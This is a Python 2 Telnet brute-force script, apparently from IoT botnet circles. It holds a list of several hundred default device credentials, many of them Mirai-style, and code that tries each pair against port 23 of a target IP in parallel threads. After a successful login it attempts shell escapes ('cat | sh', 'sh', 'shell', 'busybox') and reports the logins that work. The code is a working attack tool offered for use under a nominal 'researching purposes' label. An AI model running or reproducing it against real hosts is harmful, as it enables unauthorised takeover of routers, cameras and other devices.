#!/usr/bin/python
# Single Telnet Host Bruteforcer (For researching purposes) | By; LiGhT
import sys, os, re, time, socket
from threading import Thread

if len(sys.argv) < 2:
	print "Usage: python "+sys.argv[0]+" <ip>"
	sys.exit()

combo = [ 
	"Admin:123456",
	"admin:admin",
	"admin:123456",
	"root:camera",
	"Admin:1234",
	"admin:fliradmin",
	"admin:1234",
	"admin:jvc",
	"root:admin",
	"root:Admin",
	"admin:meinsma",
	"admin:1111111",
	"admin:4321",
	"admin:password",
	"root:ikwd",
	"admin:wbox",
	"supervisor:supervisor",
	"dm3500:merlin",
	"ubnt:ubnt",
	"none:backdoor",
	"device:device",
	"apc:apc",
	"none:atc123",
	"(none):public",
	"none:password",
	"scout:scout",
	"none:admin",
	"root:ascend",
	"none:ascend",
	"admin:epicrouter",
	"customer:none",
	"operator:1234User",
	"Service:5678Service",
	"admin:atlantis",
	"root:ROOT500",
	"manuf:xxyyzz",
	"diag:danger",
	"craft:crftpw",
	"root:cms500",
	"Administrator:ggdaseuaimhrke",
	"root:ggdaseuaimhrke",
	"root:tslinux",
	"root:pass",
	"none:NetICs",
	"security:security",
	"manager:friend",
	"manager:manager",
	"admin:bintec",
	"admin:articon",
	"patrol:patrol",
	"service:service",
	"tech:tech",
	"live:live",
	"none:Master",
	"none:laflaf",
	"none:Helpdesk",
	"none:Super",
	"installer:installer",
	"root:fivranne",
	"webadmin:webadmin",
	"user:password",
	"root:Serv4EMC",
	"admin:access",
	"admin:netadmin",
	"mediator:mediator",
	"root:Mau'dib",
	"cellit:cellit",
	"admin:diamond",
	"admin:1234admin",
	"Adminstrator:changeme",
	"netrangr:attack",
	"cmaker:cmaker",
	"admin:changeme",
	"bbsd-client:changeme2database",
	"bbsd-client:NULL",
	"root:attack",
	"admin:default",
	"Cisco:Cisco",
	"admin:cisco",
	"root:blender",
	"hsa:hsasdb",
	"wlse:wlsedb",
	"wlseuser:wlsepassword",
	"root:password",
	"citel:password",
	"admin:system",
	"epicrouter:admin",
	"cgadmin:cgadmin",
	"super:surt",
	"root:tini",
	"anonymous:any@",
	"root:davox",
	"davox:davox",
	"root:calvin",
	"admin:my_DEMARC",
	"MDaemon:MServer",
	"PBX:PBX",
	"NETWORK:NETWORK",
	"none:BRIDGE",
	"admin:michaelangelo",
	"Alphanetworks:wrgg15_di524",
	"Alphanetworks:firmware",
	"draytek:1234Admin",
	"edimax:software01",
	"admin:Administration",
	"admin:su@psir",
	"login:admin",
	"login:password",
	"none:4getme2",
	"tiger:tiger123",
	"MD110:help",
	"admin:extendnet",
	"anonymous:Exabyte",
	"root:default",
	"none:Posterie",
	"manage:!manage",
	"admin:radius",
	"netadmin:nimdaten",
	"admin:isee",
	"Factory:56789Admin",
	"storwatch:specialist",
	"vt100:public",
	"superadmin:secret",
	"hscroot:abc123",
	"admin:P@55w0rd!",
	"root:iDirect",
	"Administrator:pilou",
	"setup:setup",
	"admin:hello",
	"admin:adslroot",
	"admin:administrator",
	"susAdmin:Administrator",
	"none:0Admin",
	"admin:123Admin",
	"admin:123456Admin",
	"superuser:123456",
	"superuser:123456special",
	"superuser:superuser",
	"none:admin00",
	"root:orion99",
	"user:tivonpw",
	"setup:changeme",
	"admin:Ascend",
	"super:super",
	"readwrite:lucenttech1",
	"admin:AitbISP4eCiG",
	"service:smile",
	"cablecom:router",
	"admin:motorola",
	"sysadm:sysadm:",
	"SYSADM:sysadm",
	"vcr:NetVCR",
	"none:xdfk9874t3",
	"disttech:4tas",
	"maint:maint",
	"m1122:m1122",
	"root:3ep5w2u",
	"maint:ntacdmax",
	"supervisor:PlsChgMe",
	"write:private",
	"admin:smallbusiness",
	"admin:mu",
	"admin:microbusiness",
	"admin:pfsense",
	"admin:superuser",
	"engmode:hawk201",
	"support:h179350",
	"lp:lp",
	"radware:radware",
	"wradmin:trancell",
	"none:Col2ogro2",
	"sysadmin:password",
	"teacher:password",
	"integrator:p1nacate",
	"operator:col1ma",
	"administrator:d1scovery",
	"root:1234User",
	"admin:w2402",
	"admin:Sharp",
	"superuser:admin",
	"poll:tech",
	"eng:engineer",
	"Administrator:ganteng",
	"none:smcadmin",
	"Administrator:smcadmin",
	"smc:smcadmin",
	"admin:smcadmin",
	"admin:barricade",
	"cusadmin:highspeed",
	"mso:w0rkplac3rul3s",
	"stratacom:stratauser",
	"Symbol:Admin",
	"target:password",
	"sweex:mysweex",
	"admin:symbol",
	"operator:mercury",
	"guest:truetime",
	"admin:12345Admin",
	"super.super:master",
	"xbox:xbox",
	"tellabs:tellabs#1",
	"root:admin_1",
	"superman:talent",
	"Admin:123456Admin",
	"admin:imss7.0",
	"admin:detmond",
	"admin:1111Admin",
	"admin:22222Admin",
	"admin:x-admin",
	"11111:x-admin",
	"diag:switch",
	"admin:switch",
	"admin:zoomadsl",
	"ADSL:expert03",
	"root:anko",
	"root:oelinux123",
	"root:alpine",
	"root:maxided",
	"pi:raspberry",
	"vagrant:vagrant",
	"telnet:telnet",
	"root:zlxx.",
	"root:juantech",
	"root:avtech",
	"root:vizxv",
	"root:xc3511",
	"guest:xc3511",
	"666666:666666",
	"888888:888888",
	"111111:111111",
	"admin:bayandsl",
	"adminpldt:12345676890",
	"root:1234567890",
	"telecomadmin:admintelecom",
	"admintelecom:telecomadmin",
	"root:comcom",
	"root:zte9x15",
	"ZXDSL:ZXDSL",
	"root:Zte521",
	"D-Link:D-Link",
	"dlink:dlink",
	"DLink:DLink",
	"ftpuser:asteriskftp",
	"root:dreambox",
	"root:1111",
	"root:1234",
	"root:12345",
	"root:123456",
	"root:54321",
	"root:666666",
	"mother:fucker",
	"admin1:password",
	"admin:7ujMko0admin",
	"admin:7ujMko0vizxv",
	"root:7ujMko0admin",
	"root:7ujMko0vizxv",
	"root:hi3518",
	"root:klv123",
	"root:klv1234",
	"root:system",
	"root:realtek",
	"root:jvbzd",
	"root:xmhdipc",
	"openlgtv:openlgtv",
	"root:root123",
	"root:ahetzip8",
	"root:696969",
	"root:pa55w0rd",
	"root:123123",
	"root:b120root",
	"root:PASSWORD",
	"admin:ADMIN",
	"ADMIN:ADMIN",
	"netgear:netgear",
	"ibm:password",
	"vyatta:vyatta",
	"Admin:atc456",
	"micros:micros",
	"comcast:comcast",
	"pos:pos",
	"www:www",
	"2800:2800",
	"UBNT:UBNT",
	"netman:",
	"aDMIN:1111",
	"aDMIN:123456",
	"admin:54321",
	"root:00000000",
	"root:user",
	"root:ikwb",
	"root:changeme",
	"Administrator:",
	"administrator:1234",
	"root:ubnt",
	"Administrator:public",
	"Administrator:buh",
	"Administrator:admin",
	"admin:utstar",
	"admin:99999999",
	"admin:Meins",
	"admin:JVC",
	"admin:admin00",
	"admin:ip20",
	"admin:ip3000",
	"admin:ip400",
	"admin:tsunami",
	"admin:public",
	"admin:2601hx",
	"admin:synnet",
	"quser:quser",
	"tech:",
	"Manager:",
	"Manager:Manager",
	" :ascend",
	"ascend:ascend",
	"dlink:default",
	"login:user",
	"login:pass",
	"!root:",
	"netopia:netopia",
	"sysadm:sysadm",
	"sysadm:anicust",
	"debug:d.e.b.u.g",
	"debug:synnet",
	"echo:echo",
	"daemon:daemon",
	"demo:demo",
	"arris:admin",
	"Linksys:admin",
	"client:client",
	"cisco:CISCO",
	"7654321:7654321",
	"adsl:adsl1234",
	"root:toor",
	"dm:telnet",
	" :netadmin",
	" :hewlpack",
	" :NetICs",
	"adminttd:adminttd",
	"PlcmSpIp:PlcmSpIp",
	"11111111:11111111",
	"22222222:22222222",
	"mountsys:mountsys",
	"memotec:supervisor",
	"root:LSiuY7pOmZG2s",
	"Admin:3UJUh2VemEfUte",
	"museadmin:Muse!Admin",
	"adminpldt:1234567890",
	"pldtadmin:1234567890",
	"bbsd-client:changeme2"
]

def readUntil(tn, string, timeout=8):
	buf = ''
	start_time = time.time()
	while time.time() - start_time < timeout:
		buf += tn.recv(1024)
		time.sleep(0.01)
		if string in buf: return buf
	raise Exception('TIMEOUT!')

ip = sys.argv[1]
	
def rippr(ip,username,password):
	try:
		#print username+" "+password
		tn = socket.socket()
		tn.settimeout(8)
		tn.connect((ip,23))
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "ogin:")
		if "ogin" in hoho:
			tn.send(username + "\n")
			time.sleep(0.09)
		else:
			pass
	except Exception:
		tn.close()
	try:
		hoho = ''
		hoho += readUntil(tn, "assword:")
		if "assword" in hoho:
			tn.send(password + "\n")
			time.sleep(1)
		else:
			pass
	except Exception:
		tn.close()
	try:
		prompt = ''
		prompt += tn.recv(40960)
		if "#" in prompt or "$" in prompt or "%" in prompt or "@" in prompt or ">" in prompt:
			try:
				if ">" in prompt:
					tn.send("cat | sh" + "\n")
					time.sleep(0.01)
				success = False
				timeout = 8
				data = ["BusyBox", "Built-in"]
				tn.send("sh" + "\n")
				time.sleep(0.01)
				tn.send("shell" + "\n")
				time.sleep(0.01)
				tn.send("busybox" + "\r\n")
				buf = ''
				start_time = time.time()
				while time.time() - start_time < timeout:
					buf += tn.recv(40960)
					time.sleep(0.01)
					for info in data:
						if info in buf and "unrecognized" not in buf:
							success = True
							break
			except:
				pass
		else:
			tn.close()
		if success == True:
			print "Possible: %s | %s:%s"%(ip,username,password)
			tn.close()
			success = False
	except Exception:
		tn.close()

for information in combo:
	username = information.split(":")[0]
	password = information.split(":")[1]
	#print "starting thread %s:%s"%(username,password)
	balls = Thread(target=rippr, args=(ip,username,password,))
	balls.start()
	time.sleep(1)